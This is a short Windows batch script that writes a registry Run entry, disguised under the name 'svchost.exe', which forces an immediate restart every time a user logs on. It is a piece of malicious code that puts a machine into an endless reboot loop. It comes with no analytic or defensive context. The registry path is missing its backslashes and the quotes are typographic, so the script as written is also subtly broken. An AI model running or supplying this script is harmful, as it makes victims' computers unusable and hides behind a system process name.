@echo off

reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun /f /v “svchost.exe” /d “shutdown -r -t 00”

exit
